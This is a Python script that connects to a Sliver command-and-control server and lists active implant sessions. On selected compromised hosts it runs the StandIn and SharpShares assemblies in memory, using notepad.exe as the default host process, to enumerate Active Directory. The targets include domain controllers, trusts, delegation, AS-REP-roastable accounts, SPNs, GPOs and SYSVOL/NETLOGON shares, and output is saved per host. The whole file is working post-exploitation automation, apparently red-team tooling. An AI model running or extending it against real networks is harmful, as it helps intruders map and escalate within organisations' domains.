import os
import asyncio
import click

from functools import wraps
from sliver import SliverClientConfig, SliverClient

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
DEFAULT_CONFIG = os.path.join(CONFIG_DIR, "default.cfg")
STANDIN_EXE = 'StandIn.exe'
SHARPHOUND_EXE = 'SharpHound.exe'
SHARPSHARES_EXE = 'SharpShares.exe'
COMMANDS = {
    'ad-recon': 
        {
            STANDIN_EXE: [
                '--dns',
                '--dc',
                '--trust',
                '--delegation',
                '--asrep',
                '--spn',
                '--gpo',
                '--object ms-DS-MachineAccountQuota=*'
            ],
            # doesn't support long running tasks yet
            #SHARPHOUND_EXE: [
                #f'-c All,GPOLocalGroup --zipfilename triage.zip --collectallproperties --zippassword V3ryStr0ngP@ss --randomfilenames'
            #],
            SHARPSHARES_EXE: ['/ldap:all /filter:sysvol,netlogon,ipc$,print$']
        },
    'triage': {

    }
}

def coro(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))

    return wrapper

@click.command()
@coro
@click.option('--action', '-a', type=click.Choice(['triage', 'ad-recon']), help="Action to perform on session(s)")
@click.option('--session', '-s', multiple=True, help='Session IDs')
@click.option('--assembly-path', '-p', type=click.Path(exists=True), help="Path to C# assemblies")
@click.option('--save', type=click.Path(exists=True), default=None, help='Save output to a directory')
@click.option('--list-sessions', '-l', is_flag=True, help='Print active sessions')
@click.option('--assembly-proc', type=str, default='C:\\Windows\\System32\\notepad.exe')
async def main(action, session, assembly_path, save, list_sessions, assembly_proc):
    config = SliverClientConfig.parse_config_file(DEFAULT_CONFIG)
    client = SliverClient(config)
    try:
        await client.connect()
        sessions = await client.sessions()

        if list_sessions:
            print('{:<36} {:<32} {:<24}'.format('ID', 'User', 'Hostname'))
            for s in sessions:
                if not s.IsDead:
                    print(f"{s.ID:<36} {s.Username:<32} {s.Hostname:<24}")
            return
        
        for s1 in sessions:
            for s2 in session:
                if s1.ID == s2:
                    print(f"[+] ID: {s1.ID}, Username: {s1.Username}, Host:{s1.Hostname}")
                    interact = await client.interact_session(s1.ID, timeout=240)
                    for k in COMMANDS[action]:
                        with open(os.path.join(assembly_path, k), 'rb') as f:
                            assembly = f.read()
                        for argument in COMMANDS[action][k]:
                            execute_assembly = await interact.execute_assembly(
                                assembly, 
                                argument,
                                process=assembly_proc,
                                is_dll=False,
                                arch='x84',
                                class_name='',
                                method='',
                                app_domain=''
                            )
                            cmd = f'({s1.ID}) > {k} {argument}\n'
                            print(cmd, end='')
                            out = execute_assembly.Output.decode()
                            if save is not None:
                                with open(os.path.join(save, f'{action}-{s1.Username}-{s1.Hostname}-{s1.ID}.txt'), 'a') as f:
                                    f.write('-'*50 + '\n')
                                    f.write(cmd)
                                    f.write(out)
                                    f.write('-'*50 + '\n')
                            else:
                                print(out)

    except Exception as e:
        print(e)



if __name__ == '__main__':
    main()